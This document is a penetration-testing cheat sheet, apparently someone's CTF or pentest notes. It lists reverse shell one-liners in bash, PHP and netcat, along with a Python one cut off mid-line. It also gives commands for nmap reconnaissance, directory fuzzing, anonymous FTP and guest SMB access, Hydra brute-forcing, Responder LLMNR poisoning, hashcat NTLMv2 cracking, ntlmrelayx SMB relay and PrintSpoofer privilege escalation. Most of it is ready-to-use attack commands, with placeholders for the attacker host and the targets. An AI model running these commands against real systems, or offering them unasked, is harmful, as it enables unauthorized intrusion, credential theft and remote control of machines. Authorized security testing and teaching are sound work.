# Reverse shells

## Bash
bash -i >& /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1

## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP_ADDRESS>",<PORT>));

## PHP
php -r '$sock=fsockopen("<IP_ADDRESS>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

## Netcat
nc -e /bin/sh <IP_ADDRESS> <PORT>

# Nmap

## Basic Nmap scan
nmap -sV -sC -vv <IP_ADDRESS>

## Comprehensive Nmap scan
nmap -sV -sC -vv -p- <IP_ADDRESS>

## Nmap says it's down?
nmap -Pn..

## What to note from Nmap scans
- Open ports
- Running services
- Service versions -> Look for exploits online or using searchsploit
- FTP Anonymous login allowed?
- Is RDP running?
- Non-standard ports for services such as ssh, http etc..

# Web testing

## Initial steps (not in order)
1. Check for common dirs (robots.txt, wp-login.php etc..)
2. Fuzz dirs with ffuf & dirb -> ffuf -w <WORDLIST_PATH>:FUZZ -u <URL>/FUZZ
3. Any page that takes URL parameters?
4. What technologies are running? (Use Wappalyzer extension, check response headers etc..)
5. Check page sources
6. Any JS scripts?
7. Anything in local storage or any cookies? (Decode if possible -> Possible session hijack) 
8. Move on to SQLi vectors, mess around with requests using Burpsuite/OWASP ZAP

# FTP

## FTP Anonymous login
-> Username: anonymous
-> Password: ""

# SMB

- Try user "guest" and no password

## smbmap

- Example: smbmap -H <HOST>

## smbclient

- List shares:	smbclient -L \\\\<HOST>
- Connect: 	smbclient \\\\<HOST>\\<SHARE>

# Brute-forcing services

- Burpsuite
- OWASP ZAP

## Hydra

- Example: hydra -l <USERNAME> -P <PASSWORD_LIST> ssh://<IP_ADDRESS>
- Example: hydra -l <USERNAME> -P <PASSWORD_LIST> <IP_ADDRESS> ssh -s <PORT>
- Example: hydra -l <USERNAME> -P <PASSWORD_LIST> <TARGET_IP> http-post-form "/Account/login.aspx:<Paste request body from network -> view raw, replace fields with ^USER^ and ^PASS^>:Login failed"

# Active Directory

## Using Responder for LLMNR poisoning
- This is very noisy
- Can only be done on the same network
- Might take a lot of time to intercept traffic

sudo responder -I <INTERFACE>

### Crack captured hashes from Responder with Hashcat
hashcat -m 5600 <HASH_FILE> <PASSWORD_FILE> --force
"-m 5600" -> is for NTLMv2 hashes, check formats with --help

## SMB Relay attack
- Turn off SMB & HTTP in Responder.conf

### Check if a host has SMB signing disabled with Nmap
nmap --script=smb2-security-mode.nse -p 445 <IP/CIDR>

### Listen for events in Responder

### Set up relay

ntlmrelayx.py -tf <TARGET_LIST_FILE> -smb2support

# Windows misc

## Hosts file
-> C:\Windows\System32\drivers\etc\hosts

# Privilege escalation

## Windows privesc

### 1 (From simple reverse shell)
-> whoami /priv
-> (SeImpersonatePrivilege        Impersonate a client after authentication Enabled) ?
-> Use PrintSpoofer.exe
-> PrintSpoofer.exe -i -c cmd
